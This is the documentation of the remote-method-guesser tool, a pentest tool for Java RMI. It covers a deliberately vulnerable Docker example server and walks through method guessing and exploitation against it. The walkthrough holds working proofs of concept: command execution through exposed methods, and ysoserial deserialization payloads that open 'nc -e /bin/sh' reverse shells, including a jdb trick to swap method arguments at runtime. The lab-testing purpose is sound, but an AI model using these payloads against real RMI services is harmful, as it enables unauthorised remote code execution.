### Docker Files

----

If you want to test *remote-method-guesser*, you can do this using the docker container provided in this repository.
You can either build the container from source or load it from *GitHub Packages*.

* To build from source, just clone the repository, switch to the [docker directory](/.docker) and run ``docker build .``
  to create the container. If you also want to make adjustments to the example server, just modify the [source code](/.docker/resources/example-server)
  and build a new ``rmg-example-server.jar`` by running ``mvn package``. Afterwards, copy the ``rmg-example-sever.jar``
  to the [resources folder](/.docker/resources) and build the container using ``docker build .``.

* To load the container from *GitHub Packages*, just authenticate using your personal access token and
  run the corresponding pull command:
  ```console
  $ docker login https://docker.pkg.github.com -u <USERNAME>
  Password:

  Login Succeeded
  $ docker pull docker.pkg.github.com/qtc-de/remote-method-guesser/rmg-example-server:1.0
  ```

To change the default configuration of the container (like e.g. the *SSL* certificate), you can modify the [docker-compose.yml](/.docker/docker-compose.yml)
and start the container using ``docker-compose up``.


### Configuration Details

----

When launched with its default configuration, the container starts a *Java rmiregistry* on port ``1090``.
The registry is *SSL* protected and contains three available bound names:

```console
[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090
[+] Connecting to RMI registry... done.
[+] Obtaining a list of bound names... done.
[+] 3 names are bound to the registry.
[+] Listing bound names in registry:
[+]	• plain-server
[+]	• ssl-server
[+]	• secure-server
```

The corresponding remote objects get assigned a random port during the server startup. Each remote object
implements different kinds of vulnerable methods that can be detected by *rmg*. In the following, the corresponding
interface are listed.

#### Plain Server

The remote object that is bound as ``plain-server`` uses a plain *TCP* connection without *SSL*. It implements
the following interface:

```java
public interface IPlainServer extends Remote
{
    String notRelevant() throws RemoteException;
    String execute(String cmd) throws RemoteException;
    String system(String cmd, String[] args) throws RemoteException;
}
```

Whereas the ``notRelevant`` method just returns a static string, both other methods can be used to execute commands
on the *Java RMI* server. If you are interested in the implementation of the methods, you can read the source code
[here](/.docker/resources/example-server/src/de/qtc/rmg/PlainServer.java).


#### SSL Server

The remote object that is bound as ``ssl-server`` uses an *SSL* protected *TCP* connection. It implements
the following interface:

```java
public interface ISslServer extends Remote
{
    String notRelevant() throws RemoteException;
    int execute(String cmd) throws RemoteException;
    String system(String[] args) throws RemoteException;
}
```

Again, the ``notRelevant`` method just returns a static string, whereas the other two methods can be used to get
*Remote Code Execution*. The corresponding implementation of the methods can be found [here](/.docker/resources/example-server/src/de/qtc/rmg/PlainServer.java).


#### Secure Server

The remote object that is bound as ``secure-server`` uses a plain *TCP* connection without *SSL*. It implements
the following interface:

```java
public interface ISecureServer extends Remote
{
    String login(HashMap<String, String> credentials) throws RemoteException;
    void logMessage(int logLevel, Object message) throws RemoteException;
    void updatePreferences(ArrayList<String> preferences) throws RemoteException;
}
```

In contrast to the other two remote objects, the ``secure-server`` object does not expose any method that looks
directly exploitable. However, as the server does not use a *deserialization filter* and *ISecureServer* contains
methods that accept *non primitive types*, it is vulnerable to *deserialization attacks*. A correspondig example will be
examined below, but if you want to read some background about this type of attack I recommend reading [this great blog post](https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
by *Hans-Martin Münch*.


### Example Run

----

In the following you find an example run of *remote-method-guesser* on the provided docker container. Afterwards,
it is shown how to create *Proof-of-Concepts* for the different vulnerable methods.

To run a *Remote Method Guessing attack* against the container, you have to specify the ``--guess`` parameter during
the invocation of *rmg*. Additionally, you can enable the creation of *code samples* for each identified method by
using the ``--create-samples`` option. Don't be scared by the huge amount of output. *rmg* is pretty verbose by default
and prints information about each step of the attack. On a color enabled terminal, the most relevant parts are highlighted.

```console
[qtc@kali ~]$ rmg --ssl --guess --create-samples 172.18.0.2 1090 
[+] Connecting to RMI registry... done.
[+] Obtaining a list of bound names... done.
[+] 3 names are bound to the registry.
[-] RMI object tries to connect to different remote host: iinsecure.dev
[-] 	Redirecting the connection back to 172.18.0.2... 
[-] 	This is done for all further requests. This message is not shown again. 
[-] RMI object tries to connect to different remote host: iinsecure.dev
[-] 	Redirecting the ssl connection back to 172.18.0.2... 
[-] 	This is done for all further requests. This message is not shown again. 
[+] 
[+] Starting RMG Attack
[+] 	4 template files found.
[+] 	Compiling file /opt/remote-method-guesser/templates//LookupDummy.java... done.
[+] 	
[+] 	Current template file: 'VoidTemplate.java'
[+] 	
[+] 		Attacking boundName 'ssl-server'.
[+] 		Reading template file: '/opt/remote-method-guesser/templates//VoidTemplate.java'... done
[+] 		Writing class './rmg-src/ISslServer.java' to disk... done.
[+] 		Compiling file ./rmg-src/ISslServer.java... done.
[+] 		Getting instance of 'ssl-server'...
[+] 		Guessing methods...
[+]
[+] 		
[+] 		0 valid method names were identified for 'VoidTemplate.java'.
[+] 		Attacking boundName 'plain-server'.
[+] 		Reading template file: '/opt/remote-method-guesser/templates//VoidTemplate.java'... done
[+] 		Writing class './rmg-src/IPlainServer.java' to disk... done.
[+] 		Compiling file ./rmg-src/IPlainServer.java... done.
[+] 		Getting instance of 'plain-server'...
[+] 		Guessing methods...
[+]
[+] 		
[+] 		0 valid method names were identified for 'VoidTemplate.java'.
[+] 		Attacking boundName 'secure-server'.
[+] 		Reading template file: '/opt/remote-method-guesser/templates//VoidTemplate.java'... done
[+] 		Writing class './rmg-src/ISecureServer.java' to disk... done.
[+] 		Compiling file ./rmg-src/ISecureServer.java... done.
[+] 		Getting instance of 'secure-server'...
[+] 		Guessing methods...
[+]
[+] 			HIT: public abstract void de.qtc.rmg.ISecureServer.logMessage(int,java.lang.Object) throws java.rmi.RemoteException --> exists!
[+] 			HIT: public abstract void de.qtc.rmg.ISecureServer.updatePreferences(java.util.ArrayList) throws java.rmi.RemoteException --> exists!
[+] 		
[+] 		2 valid method names were identified for 'VoidTemplate.java'.
[+] 		Writing sample class for method 'logMessage'.
[+] 			Reading template file: '/opt/remote-method-guesser/templates//SampleTemplate.java'... done
[+] 			Preparing sample... done.
[+] 			Writing sample './rmg-samples/ISecureServerLogMessageSample/ISecureServerLogMessageSample.java' to disk... done.
[+] 		
[+] 		Writing sample class for method 'updatePreferences'.
[+] 			Reading template file: '/opt/remote-method-guesser/templates//SampleTemplate.java'... done
[+] 			Preparing sample... done.
[+] 			Writing sample './rmg-samples/ISecureServerUpdatePreferencesSample/ISecureServerUpdatePreferencesSample.java' to disk... done.
[+] 		
[+] 	
[+] 	Current template file: 'StringTemplate.java'
[+] 	
[+] 		Attacking boundName 'ssl-server'.
[+] 		Reading template file: '/opt/remote-method-guesser/templates//StringTemplate.java'... done
[+] 		Writing class './rmg-src/ISslServer.java' to disk... done.
[+] 		Compiling file ./rmg-src/ISslServer.java... done.
[+] 		Getting instance of 'ssl-server'...
[+] 		Guessing methods...
[+]
[+] 			HIT: public abstract java.lang.String de.qtc.rmg.ISslServer.system(java.lang.String[]) throws java.rmi.RemoteException --> exists!
[+] 		
[+] 		1 valid method names were identified for 'StringTemplate.java'.
[+] 		Writing sample class for method 'system'.
[+] 			Reading template file: '/opt/remote-method-guesser/templates//SampleTemplate.java'... done
[+] 			Preparing sample... done.
[+] 			Writing sample './rmg-samples/ISslServerSystemSample/ISslServerSystemSample.java' to disk... done.
[+] 		
[+] 		Attacking boundName 'plain-server'.
[+] 		Reading template file: '/opt/remote-method-guesser/templates//StringTemplate.java'... done
[+] 		Writing class './rmg-src/IPlainServer.java' to disk... done.
[+] 		Compiling file ./rmg-src/IPlainServer.java... done.
[+] 		Getting instance of 'plain-server'...
[+] 		Guessing methods...
[+]
[+] 			HIT: public abstract java.lang.String de.qtc.rmg.IPlainServer.execute(java.lang.String) throws java.rmi.RemoteException --> exists!
[+] 			HIT: public abstract java.lang.String de.qtc.rmg.IPlainServer.system(java.lang.String,java.lang.String[]) throws java.rmi.RemoteException --> exists!
[+] 		
[+] 		2 valid method names were identified for 'StringTemplate.java'.
[+] 		Writing sample class for method 'execute'.
[+] 			Reading template file: '/opt/remote-method-guesser/templates//SampleTemplate.java'... done
[+] 			Preparing sample... done.
[+] 			Writing sample './rmg-samples/IPlainServerExecuteSample/IPlainServerExecuteSample.java' to disk... done.
[+] 		
[+] 		Writing sample class for method 'system'.
[+] 			Reading template file: '/opt/remote-method-guesser/templates//SampleTemplate.java'... done
[+] 			Preparing sample... done.
[+] 			Writing sample './rmg-samples/IPlainServerSystemSample/IPlainServerSystemSample.java' to disk... done.
[+] 		
[+] 		Attacking boundName 'secure-server'.
[+] 		Reading template file: '/opt/remote-method-guesser/templates//StringTemplate.java'... done
[+] 		Writing class './rmg-src/ISecureServer.java' to disk... done.
[+] 		Compiling file ./rmg-src/ISecureServer.java... done.
[+] 		Getting instance of 'secure-server'...
[+] 		Guessing methods...
[+]
[+] 			HIT: public abstract java.lang.String de.qtc.rmg.ISecureServer.login(java.util.HashMap) throws java.rmi.RemoteException --> exists!
[+] 		
[+] 		1 valid method names were identified for 'StringTemplate.java'.
[+] 		Writing sample class for method 'login'.
[+] 			Reading template file: '/opt/remote-method-guesser/templates//SampleTemplate.java'... done
[+] 			Preparing sample... done.
[+] 			Writing sample './rmg-samples/ISecureServerLoginSample/ISecureServerLoginSample.java' to disk... done.
[+] 		
[+] 	
[+] 	Current template file: 'BooleanTemplate.java'
[+] 	
[+] 		Attacking boundName 'ssl-server'.
[+] 		Reading template file: '/opt/remote-method-guesser/templates//BooleanTemplate.java'... done
[+] 		Writing class './rmg-src/ISslServer.java' to disk... done.
[+] 		Compiling file ./rmg-src/ISslServer.java... done.
[+] 		Getting instance of 'ssl-server'...
[+] 		Guessing methods...
[+]
[+] 		
[+] 		0 valid method names were identified for 'BooleanTemplate.java'.
[+] 		Attacking boundName 'plain-server'.
[+] 		Reading template file: '/opt/remote-method-guesser/templates//BooleanTemplate.java'... done
[+] 		Writing class './rmg-src/IPlainServer.java' to disk... done.
[+] 		Compiling file ./rmg-src/IPlainServer.java... done.
[+] 		Getting instance of 'plain-server'...
[+] 		Guessing methods...
[+]
[+] 		
[+] 		0 valid method names were identified for 'BooleanTemplate.java'.
[+] 		Attacking boundName 'secure-server'.
[+] 		Reading template file: '/opt/remote-method-guesser/templates//BooleanTemplate.java'... done
[+] 		Writing class './rmg-src/ISecureServer.java' to disk... done.
[+] 		Compiling file ./rmg-src/ISecureServer.java... done.
[+] 		Getting instance of 'secure-server'...
[+] 		Guessing methods...
[+]
[+] 		
[+] 		0 valid method names were identified for 'BooleanTemplate.java'.
[+] 	
[+] 	Current template file: 'IntegerTemplate.java'
[+] 	
[+] 		Attacking boundName 'ssl-server'.
[+] 		Reading template file: '/opt/remote-method-guesser/templates//IntegerTemplate.java'... done
[+] 		Writing class './rmg-src/ISslServer.java' to disk... done.
[+] 		Compiling file ./rmg-src/ISslServer.java... done.
[+] 		Getting instance of 'ssl-server'...
[+] 		Guessing methods...
[+]
[+] 			HIT: public abstract int de.qtc.rmg.ISslServer.execute(java.lang.String) throws java.rmi.RemoteException --> exists!
[+] 		
[+] 		1 valid method names were identified for 'IntegerTemplate.java'.
[+] 		Writing sample class for method 'execute'.
[+] 			Reading template file: '/opt/remote-method-guesser/templates//SampleTemplate.java'... done
[+] 			Preparing sample... done.
[+] 			Writing sample './rmg-samples/ISslServerExecuteSample/ISslServerExecuteSample.java' to disk... done.
[+] 		
[+] 		Attacking boundName 'plain-server'.
[+] 		Reading template file: '/opt/remote-method-guesser/templates//IntegerTemplate.java'... done
[+] 		Writing class './rmg-src/IPlainServer.java' to disk... done.
[+] 		Compiling file ./rmg-src/IPlainServer.java... done.
[+] 		Getting instance of 'plain-server'...
[+] 		Guessing methods...
[+]
[+] 		
[+] 		0 valid method names were identified for 'IntegerTemplate.java'.
[+] 		Attacking boundName 'secure-server'.
[+] 		Reading template file: '/opt/remote-method-guesser/templates//IntegerTemplate.java'... done
[+] 		Writing class './rmg-src/ISecureServer.java' to disk... done.
[+] 		Compiling file ./rmg-src/ISecureServer.java... done.
[+] 		Getting instance of 'secure-server'...
[+] 		Guessing methods...
[+]
[+] 		
[+] 		0 valid method names were identified for 'IntegerTemplate.java'.
[+] Successfully guessed methods:
[+]	• ssl-server
[+]		--> public abstract java.lang.String de.qtc.rmg.ISslServer.system(java.lang.String[]) throws java.rmi.RemoteException
[+]		--> public abstract int de.qtc.rmg.ISslServer.execute(java.lang.String) throws java.rmi.RemoteException
[+]	• plain-server
[+]		--> public abstract java.lang.String de.qtc.rmg.IPlainServer.execute(java.lang.String) throws java.rmi.RemoteException
[+]		--> public abstract java.lang.String de.qtc.rmg.IPlainServer.system(java.lang.String,java.lang.String[]) throws java.rmi.RemoteException
[+]	• secure-server
[+]		--> public abstract void de.qtc.rmg.ISecureServer.logMessage(int,java.lang.Object) throws java.rmi.RemoteException
[+]		--> public abstract void de.qtc.rmg.ISecureServer.updatePreferences(java.util.ArrayList) throws java.rmi.RemoteException
[+]		--> public abstract java.lang.String de.qtc.rmg.ISecureServer.login(java.util.HashMap) throws java.rmi.RemoteException
```

The output above shows that *rmg* was able to identify a total of ``7`` methods distributed over the three available *bound names*.
Additionally, as *rmg* was run with ``--create-samples``, a ``rmg-samples`` folder was created that contains *sample code* to call
each of the identified methods:

```console
[qtc@kali ~]$ ls -l rmg-samples/
total 28
drwxr-xr-x 2 qtc qtc 4096 Sep 26 15:18 IPlainServerExecuteSample
drwxr-xr-x 2 qtc qtc 4096 Sep 26 15:18 IPlainServerSystemSample
drwxr-xr-x 2 qtc qtc 4096 Sep 26 15:18 ISecureServerLogMessageSample
drwxr-xr-x 2 qtc qtc 4096 Sep 26 15:18 ISecureServerLoginSample
drwxr-xr-x 2 qtc qtc 4096 Sep 26 15:18 ISecureServerUpdatePreferencesSample
drwxr-xr-x 2 qtc qtc 4096 Sep 26 15:18 ISslServerExecuteSample
drwxr-xr-x 2 qtc qtc 4096 Sep 26 15:18 ISslServerSystemSample
```

In the following, two of these created samples are examined in more detailed and it is shown how they can be used to validate vulnerable
methods.


#### IPlainServerExecuteSample

The probably easiest of the above created samples is ``IPlainServerExecuteSample`` with a method signature of:

```java
java.lang.String de.qtc.rmg.IPlainServer.execute(java.lang.String)
```

Looking at the method name, the return type and the argument type, one can already guess that this method simply executes the provided argument
as an operating system command and returns the corresponding result. The corresponding template ``IPlainServerExecuteSample.java`` contains all
the code that is required to invoke the corresponding method. About 90% of this code are related to the connection setup and are not relevant for
the actual usage of the template. The only really relevant part is the following:

```java
System.out.print("[+] Connecting to registry on " + remoteHost + ":" + remotePort + "... ");
Registry registry = null;

if( true ) {
    RMIClientSocketFactory csf = new SslRMIClientSocketFactory();
    registry = LocateRegistry.getRegistry(remoteHost, remotePort, csf);
} else {
    registry = LocateRegistry.getRegistry(remoteHost, remotePort);
}

System.out.println("done!");

System.out.println("[+] Starting lookup on plain-server... ");
IPlainServer stub = (IPlainServer) registry.lookup("plain-server");

java.lang.String argument0 = TODO;

System.out.print("[+] Invoking method execute... ");
java.lang.String response = stub.execute(argument0);
System.out.println("done!");

System.out.println("[+] The servers response is: " + response);
```

The *Java* code displayed above is responsible for the actual method call. Whereas *remote-method-guesser* is able to
generate most of the code automatically, it cannot reason about the arguments you want to use for the method call.
Therefore, the generated code contains one ``TODO`` for each argument, that needs to be replaced manually. The
variable type gives an indication what type of *Java* object is expected (a ``String`` in the above case). You
may also want to adjust what is done with the return value of the method call. By default, it is used as part
of a *print statement*.

For the current case, where the method most likely just executes an operating system command, we can replace
``TODO`` with ``id``. After making this change and saving the file, we can compile and execute it:

```console
[qtc@kali IPlainServerExecuteSample]$ javac IPlainServerExecuteSample.java 
[qtc@kali IPlainServerExecuteSample]$ java IPlainServerExecuteSample 
[+] Connecting to registry on 172.17.0.2:1090... done!
[+] Starting lookup on plain-server... 
[+] RMI object tries to connect to different remote host: iinsecure.dev
[+]	Redirecting the connection back to 172.17.0.2... 
[+]	This is done for all further requests. This message is not shown again. 
[+] Invoking method execute... done!
[+] The servers response is: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

As expected, we get code execution on the *Java RMI* server.


#### ISecureServerLogMessageSample

The ``ISecureServerLogMessageSample`` is different from the previous one, as it does not use a method
that exposes dangerous functionality directly. However, as it accepts an arbitrary object as input parameter, it
is vulnerable to *deserialization attacks* (actually, the method itself is not vulnerable, but the server is, as it
does not implement a proper *deserialization whitelist*). For an successful attack, a suitable *gadget chain* needs
to be available on the application servers classpath. In case of the container provided within this repository,
``commons-collections-3.1`` was manually added to create a vulnerable instance.

To test the *insecure deserialization*, we can use *ysoserial* as a library and modify the sample *Java* code from
the previous example like this:

```java
[...]
import javax.net.ssl.TrustManager;
import javax.rmi.ssl.SslRMIClientSocketFactory;

import de.qtc.rmg.ISecureServer;

import ysoserial.payloads.ObjectPayload.Utils;

/*
 * Compile this sample class with the following command:
 *      javac ISecureServerLogMessageSample.java
 */
public class ISecureServerLogMessageSample extends SSLSocketFactory {
[...]

try {

    System.out.print("[+] Connecting to registry on " + remoteHost + ":" + remotePort + "... ");
    Registry registry = null;

    if( true ) {
        RMIClientSocketFactory csf = new SslRMIClientSocketFactory();
        registry = LocateRegistry.getRegistry(remoteHost, remotePort, csf);
    } else {
        registry = LocateRegistry.getRegistry(remoteHost, remotePort);
    }

    System.out.println("done!");

    System.out.println("[+] Starting lookup on secure-server... ");
    ISecureServer stub = (ISecureServer) registry.lookup("secure-server");

    int argument0 = 1;
    java.lang.Object argument1 = Utils.makePayloadObject("CommonsCollections6", "nc 172.17.0.1 4444 -e /bin/sh");

    System.out.print("[+] Invoking method logMessage... ");
    stub.logMessage(argument0, argument1);
    System.out.println("done!");

[...]
```

During the compilation, we need the ``ysoserial.jar`` file in our classpath:

```console
[qtc@kali ISecureServerLogMessageSample]$ javac -cp /opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT.jar:. ISecureServerLogMessageSample.java
```

After executing the sample, our custom client will connect to the *RMI server* and send
the malicious *ysoserial* gadget as argument to the ``logMessage`` method. As no deserialization filter
is applied, the server will *deserialize* the *gadget*. This causes an exception on the server side,
as the *deserialized* class does not match the servers expectations. However, the attack is already
finished at this point and we obtained a shell:

```console
[qtc@kali ISecureServerLogMessageSample]$ java -cp /opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar:. ISecureServerLogMessageSample
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Connecting to registry on 172.17.0.2:1090... done!
[+] Starting lookup on secure-server...
[+] RMI object tries to connect to different remote host: iinsecure.dev
[+]	Redirecting the connection back to 172.17.0.2...
[+]	This is done for all further requests. This message is not shown again.
[+] Invoking method logMessage... failed!
[-] The following exception was thrown:java.util.HashSet cannot be cast to java.lang.String
[-] Full stacktrace:
java.lang.ClassCastException: java.util.HashSet cannot be cast to java.lang.String
	at de.qtc.rmg.SecureServer.logMessage(SecureServer.java:29)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:498)
	at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:357)
	at sun.rmi.transport.Transport$1.run(Transport.java:200)
	at sun.rmi.transport.Transport$1.run(Transport.java:197)
	at java.security.AccessController.doPrivileged(Native Method)
	at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
	at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)
	at java.security.AccessController.doPrivileged(Native Method)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:748)
	at java.rmi/sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:283)
	at java.rmi/sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:260)
	at java.rmi/sun.rmi.server.UnicastRef.invoke(UnicastRef.java:161)
	at java.rmi/java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(RemoteObjectInvocationHandler.java:209)
	at java.rmi/java.rmi.server.RemoteObjectInvocationHandler.invoke(RemoteObjectInvocationHandler.java:161)
	at com.sun.proxy.$Proxy0.logMessage(Unknown Source)
	at ISecureServerLogMessageSample.main(ISecureServerLogMessageSample.java:105)


[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:38597.
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```


#### ISecureServerLoginSample

The ``ISecureServerLoginSample`` can also be used for *deserialization attacks*. However, in contrast
to the ``logMessage`` method, the ``login`` method expects a ``HashMap`` as argument. On the server side,
this doesn't really matter, as the server tries to *deserialize* our input object anyway (this is true for
all non primitive types except the ``String`` type. Again, read the [blog post](https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
from *Hans-Martin* if you want to know more about this). On the client side, however, the attack becomes more
difficult as we can not simply invoke the ``login`` method with an arbitrary ``ysoseial`` gadget, as this causes
a type mismatch.

When invoking a *RMI* method, the client computes a hash over the methods signature and sends it to the server.
If the corresponding method signature exists on the server side, the server gives its okay for the call. Simply
redefining the *remote objects* interface on the client side to accept arbitrary objects is therefore not an option.

In the previously mentioned blog post of *Hans-Martin*, he solves this problem by attaching a debugger and replacing
the method arguments at runtime. As pointed out by him, the ``invokeRemoteMethod`` call from the ``java.rmi.server.RemoteObjectInvocationHandler`` class
(which is responsible for all *RMI* calls) treats all method arguments as an array of type ``Object`` anyway.
Hooking this function and replacing the input arguments is therefore quite easy.

```java
private Object invokeRemoteMethod(Object proxy, Method method, Object[] args) throws Exception
{
    try {
        if (!(proxy instanceof Remote)) {
            throw new IllegalArgumentException(
                "proxy not Remote instance");
        }
        return ref.invoke((Remote) proxy, method, args,
                          getMethodHash(method));
    } catch (Exception e) {
        if (!(e instanceof RuntimeException)) {
            Class<?> cl = proxy.getClass();
            try {
                method = cl.getMethod(method.getName(),
                                      method.getParameterTypes());
            } catch (NoSuchMethodException nsme) {
                throw (IllegalArgumentException)
                    new IllegalArgumentException().initCause(nsme);
            }
            Class<?> thrownType = e.getClass();
            for (Class<?> declaredType : method.getExceptionTypes()) {
                if (declaredType.isAssignableFrom(thrownType)) {
                    throw e;
                }
            }
            e = new UnexpectedException("unexpected exception", e);
        }
        throw e;
    }
}
```

In the general case, [YouDebug](http://youdebug.kohsuke.org/) is probably the better choice for tampering with the
arguments, but in our case *jdb* is sufficient. First, we prepare ``ISecureServerLoginSample.java`` to include out
``ysoserial`` payload:

```java
[...]
import ysoserial.payloads.ObjectPayload.Utils;

/*
 * Compile this sample class with the following command:
 *      javac -d . ISecureServerLoginSample.java
 */
public class ISecureServerLoginSample extends SSLSocketFactory {

    private static int remotePort = 1090;
    private static String remoteHost = "172.17.0.2";

    public static Object[] payload = new Object[]{Utils.makePayloadObject("CommonsCollections6", "nc 172.17.0.1 4444 -e /bin/sh")};

    public static void main(String[] argv) {
[...]

      try {

          System.out.print("[+] Connecting to registry on " + remoteHost + ":" + remotePort + "... ");
          Registry registry = null;

          if( true ) {
              RMIClientSocketFactory csf = new SslRMIClientSocketFactory();
              registry = LocateRegistry.getRegistry(remoteHost, remotePort, csf);
          } else {
              registry = LocateRegistry.getRegistry(remoteHost, remotePort);
          }

          System.out.println("done!");

          System.out.println("[+] Starting lookup on secure-server... ");
          ISecureServer stub = (ISecureServer) registry.lookup("secure-server");

          java.util.HashMap argument0 = new HashMap();;

          System.out.print("[+] Invoking method login... ");
          java.lang.String response = stub.login(argument0);
          System.out.println("done!");

          System.out.println("[+] The servers response is: " + response);
```

Now we need to compile ``ISecureServerLoginSample.java`` with ``ysoserial`` within our classpath. Afterwards,
we can run the sample within *jdb*.

```console
[qtc@kali ISecureServerLoginSample]$ javac -cp /opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT.jar:. ISecureServerLoginSample.java 
[qtc@kali ISecureServerLoginSample]$ jdb -classpath /opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar:. ISecureServerLoginSample
Initializing jdb ...

> stop in java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod
Deferring breakpoint java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod.
It will be set after the class is loaded.

> run
run ISecureServerLoginSample
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable

> 
VM Started: [+] Connecting to registry on 172.17.0.2:1090... done!
[+] Starting lookup on secure-server... 
Set deferred breakpoint java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod
[+] RMI object tries to connect to different remote host: iinsecure.dev
[+]	Redirecting the connection back to 172.17.0.2... 
[+]	This is done for all further requests. This message is not shown again. 
[+] Invoking 
Breakpoint hit: method login... "thread=main", java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(), line=206 bci=0

main[1] eval args
 args = instance of java.lang.Object[1] (id=2257)

main[1] eval args=ISecureServerLoginSample.payload
 args=ISecureServerLoginSample.payload = instance of java.lang.Object[1] (id=2259)

main[1] cont
> failed!

[-] The following exception was thrown:argument type mismatch
[-] Full stacktrace:
java.lang.IllegalArgumentException: argument type mismatch
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
[...]
```

As expected, we get an ``IllegalArgumentException``. However, at this point the attack is already done
and we obtained a shell on our *nc* listener:

```console
[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:41821.
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```
